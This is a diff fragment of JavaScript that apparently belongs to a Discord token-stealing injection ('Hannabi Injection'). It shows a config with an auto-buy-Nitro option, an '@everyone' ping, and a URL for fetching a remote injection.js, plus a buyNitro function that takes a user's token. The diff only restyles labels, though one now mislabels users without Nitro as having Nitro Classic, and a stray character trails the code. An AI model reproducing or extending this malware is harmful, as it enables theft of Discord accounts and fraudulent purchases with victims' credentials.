@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Hannabi Injection', 
+  embed_name: 'Hannabi', 
   embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g, '%20'), 
   embed_color: 8363488, 
   injection_url: 'https://raw.githubusercontent.com/Rldqzo/Rkdzqdzq21dqz123d231qzqdz/main/injection.js', 
@@ -564,11 +564,11 @@ const buyNitro = async (token) => {
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return 'No Nitro';
+      return '<:classic:896119171019067423> \`Nitro Classic\`';
     case 1:
-      return 'Nitro Classic';
+      return '<:classic:896119171019067423> \`Nitro Classic\`';
     case 2:
-      return 'Nitro Boost';
+      return '<a:boost:824036778570416129> \`Nitro Boost\`';
     default:
       return 'No Nitro';
   }z
